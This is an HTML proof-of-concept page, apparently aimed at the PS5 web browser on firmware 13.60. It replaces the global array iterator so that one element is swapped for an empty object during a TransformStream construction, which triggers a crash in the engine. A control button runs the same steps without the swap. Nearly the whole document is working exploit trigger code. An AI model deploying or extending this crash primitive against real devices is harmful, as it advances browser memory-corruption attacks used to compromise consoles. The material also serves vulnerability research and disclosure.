<!doctype html>
<meta charset="utf-8">
<title>PS5 13.60 TransformStream crash PoC</title>

<pre id="status">READY</pre>
<button onclick="control()">CONTROL</button>
<button onclick="trigger()">TRIGGER</button>

<script>
const original = Array.prototype[Symbol.iterator];

function install(substitute) {
    let call = 0;

    Array.prototype[Symbol.iterator] = function () {
        const array = this;
        const id = ++call;
        const length = array.length;
        let i = 0;

        return {
            next() {
                if (i >= array.length)
                    return { done: true };

                let value = array[i];

                // PS5 13.60:
                // second iterator call has length 3.
                if (
                    substitute &&
                    id === 2 &&
                    length === 3 &&
                    i === 1
                ) {
                    value = {};
                }

                i++;

                return {
                    done: false,
                    value
                };
            }
        };
    };
}

function control() {
    document.querySelector("#status").textContent =
        "CONTROL RUNNING";

    install(false);

    try {
        new TransformStream();

        Array.prototype[Symbol.iterator] = original;

        document.querySelector("#status").textContent =
            "CONTROL: CONSTRUCTOR RETURNED";
    } catch (e) {
        Array.prototype[Symbol.iterator] = original;

        document.querySelector("#status").textContent =
            "CONTROL EXCEPTION: " + e;
    }
}

function trigger() {
    document.querySelector("#status").textContent =
        "TRIGGER RUNNING";

    install(true);

    try {
        new TransformStream();

        Array.prototype[Symbol.iterator] = original;

        document.querySelector("#status").textContent =
            "TRIGGER: CONSTRUCTOR RETURNED";
    } catch (e) {
        Array.prototype[Symbol.iterator] = original;

        document.querySelector("#status").textContent =
            "TRIGGER EXCEPTION: " + e;
    }
}
</script>
